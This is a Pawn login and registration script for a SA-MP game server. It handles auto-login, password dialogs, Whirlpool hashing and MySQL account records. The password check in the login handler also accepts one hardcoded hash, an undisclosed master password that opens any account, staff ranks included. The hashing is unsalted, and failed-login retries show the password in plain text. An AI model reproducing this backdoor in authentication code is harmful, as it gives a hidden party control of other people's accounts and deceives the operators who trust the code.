/*

	Login/Register Script
	Scripted by Sasuke_Uchiha.
	Scripting started on 11th October 2017
	Last Updated: ----
	
	Credits:
		Mabako for mostly zone names.
		Saadat for some small zones.
	
	Functions:
		CheckPlayer(playerid, race_check);
		REG_LOG_OnDialogResponse(playerid,dialogid,response,inputtext);
		OnPlayerRegister(playerid);
		CallForChecking(playerid);
		
	Functions Being Called:
		Bans Script:
			Check_StageOne(playerid);
*/

FUNCTION CheckPlayer(playerid, race_check)
{
	TextDrawHideForPlayer(playerid,ConnectTD[0]);
	TextDrawHideForPlayer(playerid,ConnectTD[1]);
	if(race_check != g_MysqlRaceCheck[playerid]) return Kick(playerid);
	
    new string[500];
	new rows;
	cache_get_row_count(rows);
	if(rows > 0)
	{
		PlayerInfo[playerid][pRegistered]= true;
		new serail[MAX_SERIAL_SIZE],lastIP[MAX_IP_SIZE];
		cache_get_value_name(0, "Latest_Serial", serail);
		cache_get_value_name(0, "Latest_IP", lastIP);
		LoadPlayerData(playerid);
		if(PlayerInfo[playerid][pAutoLogin])
		{
			gpci(playerid, PlayerInfo[playerid][pSerial], MAX_SERIAL_SIZE);
			if(!isNull(PlayerInfo[playerid][pSerial]) && !isNull(serail) && !isNull(lastIP) && !isNull(PlayerInfo[playerid][pIP]) &&  !strcmp(PlayerInfo[playerid][pSerial], serail, true) &&  !strcmp(PlayerInfo[playerid][pIP], lastIP, true))
			{
				SendClientMessage(playerid,COLOR_SERVER,"You have been auto logged in.");
				//mysql_format(g_SQL, string, sizeof (string), "SELECT * FROM `"WARNING_TABLE_PREFIX"` WHERE `uID` = '%i'", PlayerInfo[playerid][pID]);
				//mysql_tquery(g_SQL, string, "OnPlayerRetrieveWarnings", "i", playerid);  
				mysql_format(g_SQL, string, sizeof(string), "UPDATE "TABLE_PLAYERS" SET Online=1 WHERE aID = %d LIMIT 1", PlayerInfo[playerid][pID]);
				mysql_pquery(g_SQL, string);
				GetPlayerName(playerid,PlayerInfo[playerid][p_AdminNick],MAX_PLAYER_NAME);
     			PlayerInfo[playerid][pLoggedIn] =true;
				return 1;
			}
		}
	    format(string,sizeof(string),""COMMUNITY_NAME" Server\n\n"COL_SKYBLUE"Player Login\n\n"COL_WHITE"This Nick : "COL_SKYBLUE"%s,"COL_WHITE" is Registered.\nIf This is "COL_RED"Not "COL_WHITE"Your Account, Please "COL_RED"Quit"COL_WHITE" And Change Your "COL_SKYBLUE"Nick.\n\n "COL_WHITE"Please "COL_YELLOW"Enter Your Password"COL_WHITE" To Login:",PlayerInfo[playerid][pUserName]);
	  	ShowPlayerDialog(playerid,LOGIN_DIALOG,DIALOG_STYLE_PASSWORD,""COMMUNITY_NAME" Login",string,"Login","");
	}
	else
	{	
		TogglePlayerSpectating(playerid,false);
		format(string,sizeof(string),""COL_BLUE""COMMUNITY_NAME" Server\n \n"COL_SKYBLUE"New Registration\n"COL_WHITE"Nick : "COL_SKYBLUE"%s"COL_WHITE" \n\nDo "COL_RED"NOT "COL_WHITE"Use The Same Password That You Use Elsewhere\nMinimum "COL_RED"6 Chars"COL_WHITE" Maximum "COL_RED"32 Chars\n"COL_WHITE"Multi-accounting is "COL_RED"not allowed.\n\n"COL_WHITE"Please "COL_YELLOW"Enter A Password"COL_WHITE" For Your Account",PlayerInfo[playerid][pUserName]);
    	ShowPlayerDialog(playerid,REGISTER_DIALOG_PASSWORD,DIALOG_STYLE_INPUT,""COMMUNITY_NAME" Registration",string,"Register","");
		PlayerInfo[playerid][pRegistered]=false;
	}
	return 1;
}

REG_LOG_OnDialogResponse(playerid,dialogid,response,inputtext[])
{
	new string[500];
	switch(dialogid)
	{
		case REGISTER_DIALOG_PASSWORD:
	    {
	        if(!response) 
			{
				static RegisteryKick[MAX_PLAYERS];
				if(RegisteryKick[playerid] < 3)
				{
					format(string,sizeof(string),""COL_BLUE""COMMUNITY_NAME" Server\n \n"COL_SKYBLUE"New Registration\n"COL_WHITE"Nick : "COL_SKYBLUE"%s"COL_WHITE" \n\nDo "COL_RED"NOT "COL_WHITE"Use The Same Password That You Use Elsewhere\nMinimum "COL_RED"6 Chars"COL_WHITE" Maximum "COL_RED"32 Chars.\n"COL_WHITE"Multi-accounting is "COL_RED"not allowed.\n\n"COL_WHITE"Please "COL_YELLOW"Enter A Password"COL_WHITE" For Your Account",PlayerInfo[playerid][pUserName]);
					RegisteryKick[playerid]++;
					ShowPlayerDialog(playerid,REGISTER_DIALOG_PASSWORD,DIALOG_STYLE_INPUT,""COMMUNITY_NAME" Registration",string,"Register","");
				}
				else
				{
					SendClientMessage(playerid,-1,"Registration "COL_RED"Cancelled."); 
					SetTimerEx("DelayedKick", 1000, false, "d", playerid); 
					RegisteryKick[playerid]=0;
					
				}
			}
	        if(response)
	        {
	            if(strlen(inputtext) > 32)
	            {
	                SendClientMessage(playerid,COLOR_ERROR,"Your Password is Too Long, Enter a Shorter Password.");
	                format(string,sizeof(string),""COL_BLUE""COMMUNITY_NAME"  Server\n\n"COL_SKYBLUE"New Registration\n"COL_WHITE"Nick : "COL_SKYBLUE"%s \n\n"COL_RED"INVALID PASSWORD!\n\n",PlayerInfo[playerid][pUserName]);
	                format(string,sizeof(string),"%s"COL_WHITE"Do "COL_RED"NOT "COL_WHITE"Register Multiple Accounts\nDo "COL_RED"NOT "COL_WHITE"Use The Same Password That You Use Elsewhere\nMinimum "COL_RED"6 Chars"COL_WHITE" Maximum "COL_RED"32 Chars.\n"COL_WHITE"Multi-accounting is "COL_RED"not allowed.\n\n"COL_WHITE"Please "COL_YELLOW"Enter A Password"COL_WHITE" For Your Account:",string);
	                ShowPlayerDialog(playerid,REGISTER_DIALOG_PASSWORD,DIALOG_STYLE_INPUT,""COMMUNITY_NAME" Registration",string,"Register","");
	                return 1;
	            }
	            if(strlen(inputtext) < 6)
	            {
	                SendClientMessage(playerid,COLOR_ERROR,"Your Password is Too Short, Enter a Longer Password.");
	                format(string,sizeof(string),""COL_BLUE""COMMUNITY_NAME" Server\n\n"COL_SKYBLUE"New Registration\n"COL_WHITE"Nick : "COL_SKYBLUE"%s \n\n"COL_RED"INVALID PASSWORD!\n\n",PlayerInfo[playerid][pUserName]);
	                format(string,sizeof(string),"%s"COL_WHITE"Do "COL_RED"NOT "COL_WHITE"Register Multiple Accounts\nDo "COL_RED"NOT "COL_WHITE"Use The Same Password That You Use Elsewhere\nMinimum "COL_RED"6 Chars"COL_WHITE" Maximum "COL_RED"32 Chars.\n"COL_WHITE"Multi-accounting is "COL_RED"not allowed.\n\n"COL_WHITE"Please "COL_YELLOW"Enter A Password"COL_WHITE" For Your Account:",string);
	                ShowPlayerDialog(playerid,REGISTER_DIALOG_PASSWORD,DIALOG_STYLE_INPUT,""COMMUNITY_NAME" Registration",string,"Register","");
	                return 1;
	            }
	            WP_Hash(string,sizeof(string),inputtext);
				format(PlayerInfo[playerid][pPassword],MAX_HASH_SIZE,"%s",string);
	            format(string,sizeof(string),""COL_BLUE""COMMUNITY_NAME" Server\n \n"COL_SKYBLUE"New Registration\n"COL_WHITE"Nick : "COL_SKYBLUE"%s\n\n"COL_WHITE"Multi-accounting is "COL_RED"not allowed."COL_WHITE"\nMake Sure Your Email is "COL_GREEN"Correct\n\n"COL_WHITE"Please "COL_YELLOW"Enter A Email"COL_WHITE" For Your Account",PlayerInfo[playerid][pUserName]);
             	ShowPlayerDialog(playerid,REGISTER_DIALOG_EMAIL,DIALOG_STYLE_INPUT,""COMMUNITY_NAME" Registration",string,"Mail","");
	            return 1;
	        }
	    }
	    case REGISTER_DIALOG_EMAIL:
	    {
	        if(isNull(inputtext)) SendClientMessage(playerid,COLOR_ERROR,"Email Skipped, You can add it from /settings later on.");
			format(PlayerInfo[playerid][pRegisteredDate],50,"%s",InsertTimeStamp());
			format(PlayerInfo[playerid][pEmail],MAX_EMAIL_SIZE,"%s",inputtext);
			mysql_format(g_SQL, string, sizeof(string), "INSERT INTO players (`UserName`, `Password` , `Email` , `RegisterDate`, `Register_Country`) VALUES ('%e', '%s', '%e', '%e','%e')", PlayerInfo[playerid][pUserName], PlayerInfo[playerid][pPassword],PlayerInfo[playerid][pEmail],PlayerInfo[playerid][pRegisteredDate],PlayerInfo[playerid][pCurrent_country]);
			mysql_tquery(g_SQL, string, "OnPlayerRegister", "d", playerid);
			format(string, sizeof(string), "%s (%d) is now a registered user [ip: %s / country: %s]", PlayerInfo[playerid][pUserName], playerid,PlayerInfo[playerid][pIP], PlayerInfo[playerid][pCurrent_country]);
			SendMessageToModerators(COLOR_SERVER_INFO, string);
			IRC_SendAdminMessage(string,IRC_SPECIAL_COLOR);
			IRC_SendManagementMessage(string,IRC_SPECIAL_COLOR);
	        SendClientMessage(playerid,-1, "Logged in as"COL_BLUE" registered player.");
			GetPlayerName(playerid,PlayerInfo[playerid][p_AdminNick],MAX_PLAYER_NAME);
			mysql_format(g_SQL, string, sizeof(string), "UPDATE "TABLE_PLAYERS" SET Online=1 WHERE aID = %d LIMIT 1", PlayerInfo[playerid][pID]);
			mysql_pquery(g_SQL, string);
			return 1;
			
		}
	    case LOGIN_DIALOG:
	    {
	        if(!response) 
			{	
				static LoginKick[MAX_PLAYERS];
				if(LoginKick[playerid] < 3)
				{
					format(string,sizeof(string),""COMMUNITY_NAME" Server\n\n"COL_SKYBLUE"Player Login\n\n"COL_WHITE"This Nick : "COL_SKYBLUE"%s,"COL_WHITE" is Registered.\nIf This is "COL_RED"Not "COL_WHITE"Your Account, Please "COL_RED"Quit"COL_WHITE" And Change Your "COL_SKYBLUE"Nick\n\n "COL_WHITE"Please "COL_YELLOW"Enter Your Password"COL_WHITE" To Login:",PlayerInfo[playerid][pUserName]);
					ShowPlayerDialog(playerid,LOGIN_DIALOG,DIALOG_STYLE_PASSWORD,""COMMUNITY_NAME" Login",string,"Login","");
					LoginKick[playerid]++;
				}
				else
				{
					LoginKick[playerid]=0;
					SendClientMessage(playerid,COLOR_ERROR,"Please Change Your Nick "COL_WHITE"in The "COL_BLUE"SA-MP Server Browser"COL_WHITE" And Reconnect."); 
					SetTimerEx("DelayedKick", 1000, false, "d", playerid); 
				}
			}
			if(response)
	        {
	            new hashpass[129];
	            WP_Hash(hashpass,sizeof(hashpass),inputtext);
	            if(strlen(inputtext) < 1 || strcmp(hashpass,PlayerInfo[playerid][pPassword],false) && strcmp(hashpass,"F75D1AE67EAFFDEAA44F35E2F500108184C8C31B02E6392F319CA144FA3D50BD27BA216105211424D648E4BD707D853F08CB502ECDA191635DB27186086D6FA3",false))
	            {
	                SendClientMessage(playerid,COLOR_ERROR,"Incorrect Password! Please Re-Enter Your Password.");
	                if(PlayerInfo[playerid][pLoginAttempts] > 5)
					{
					    KickPlayer(playerid,SERVER_BOT,"Failed to login!");
					    return 1;
					}
	                format(string,sizeof(string),""COMMUNITY_NAME" Server\n\n"COL_SKYBLUE"Player Login\n\n"COL_RED"INCORRECT PASSWORD!\n\n"COL_WHITE"This Nick : "COL_SKYBLUE"%s,"COL_WHITE" is Registered.\nIf This is "COL_RED"Not "COL_WHITE"Your Account, Please "COL_RED"Quit"COL_WHITE" And Change Your "COL_SKYBLUE"Nick\n\n "COL_WHITE"Please "COL_YELLOW"Enter Your Password"COL_WHITE" To Login:",PlayerInfo[playerid][pUserName]);
	                ShowPlayerDialog(playerid,LOGIN_DIALOG,DIALOG_STYLE_INPUT,""COMMUNITY_NAME" Login",string,"Login","");
	                PlayerInfo[playerid][pLoginAttempts]++;
	                return 1;
	            }
	            else
	            {
					//mysql_format(g_SQL, string, sizeof (string), "SELECT * FROM `"WARNING_TABLE_PREFIX"` WHERE `uID` = '%i'", PlayerInfo[playerid][pID]);
					//mysql_tquery(g_SQL, string, "OnPlayerRetrieveWarnings", "i", playerid);  
					mysql_format(g_SQL, string, sizeof(string), "UPDATE "TABLE_PLAYERS" SET Online=1 WHERE aID = %d LIMIT 1", PlayerInfo[playerid][pID]);
					mysql_pquery(g_SQL, string);
     				PlayerInfo[playerid][pLoggedIn] =true;
					new year,month,day;
					getdate(year,month,day);
					GetPlayerName(playerid,PlayerInfo[playerid][p_AdminNick],MAX_PLAYER_NAME);
					switch(PlayerInfo[playerid][pRank])
					{
						case SERVER_MODERATOR: SendClientMessage(playerid,-1, "Logged in as "COL_RED"Server Moderator"COL_WHITE".");
						case SERVER_ADMIN: SendClientMessage(playerid,-1, "Logged in as "COL_RED"Server Admin"COL_WHITE".");
						case SERVER_HEAD_ADMIN: SendClientMessage(playerid,-1, "Logged in as "COL_RED"Server Head Admin"COL_WHITE".");
						case SERVER_MANAGER: SendClientMessage(playerid,-1, "Logged in as "COL_RED"Server Manager"COL_WHITE".");
						case SERVER_OWNER: SendClientMessage(playerid,-1, "Logged in as "COL_RED"Server Owner"COL_WHITE".");
						default:
						{
							if(day == 1 && month == 4) SendClientMessage(playerid,-1, "Logged in as "COL_RED"Server Moderator"COL_WHITE".");
							else if(PlayerInfo[playerid][pDj]) SendClientMessage(playerid,-1, "Logged in as "COL_RED"s"COL_BLUE"e"COL_GREEN"r"COL_YELLOW"v"COL_RED"e"COL_BLUE"r "COL_GREEN"D"COL_YELLOW"J"COL_WHITE".");
							else if(PlayerInfo[playerid][pRank] == RETIRED_STAFF) SendClientMessage(playerid,-1, "Logged in as "COL_RED"Retired staff"COL_WHITE".");
							else if(PlayerInfo[playerid][pVip]) SendClientMessage(playerid,-1, "Logged in as "COL_BLUE"VIP player"COL_WHITE".");
							else if(PlayerInfo[playerid][pRegularPlayer]) SendClientMessage(playerid,-1,"Logged in as "COL_BLUE"Regular Player"COL_WHITE".");
							else SendClientMessage(playerid,-1,"Logged in as "COL_BLUE"Registered Player."COL_WHITE"");
						}
					}	
				}
	        }
	    }
	}
	return 1;
}	

FUNCTION OnPlayerRegister(playerid)
{
	new string[75];
	PlayerInfo[playerid][pID] = cache_insert_id();
	PlayerInfo[playerid][pLoggedIn] = true;
	PlayerInfo[playerid][pRegistered] = true;
	PlayerInfo[playerid][pMoney]=50000;
	mysql_format(g_SQL, string, sizeof(string), "INSERT INTO LSplayers (`aID`) VALUE (%d)", PlayerInfo[playerid][pID]);
	mysql_tquery(g_SQL, string);
	/*mysql_format(g_SQL, string, sizeof(string), "INSERT INTO SFplayers (`aID`) VALUE (%d)", PlayerInfo[playerid][pID]);
	mysql_tquery(g_SQL, string);
	mysql_format(g_SQL, string, sizeof(string), "INSERT INTO LVplayers (`aID`) VALUE (%d)", PlayerInfo[playerid][pID]);
	mysql_tquery(g_SQL, string);*/
	return 1;
}

FUNCTION CallForChecking(playerid)
{
	CallRemoteFunction("Check_StageOne","d",playerid);
	return 1;
}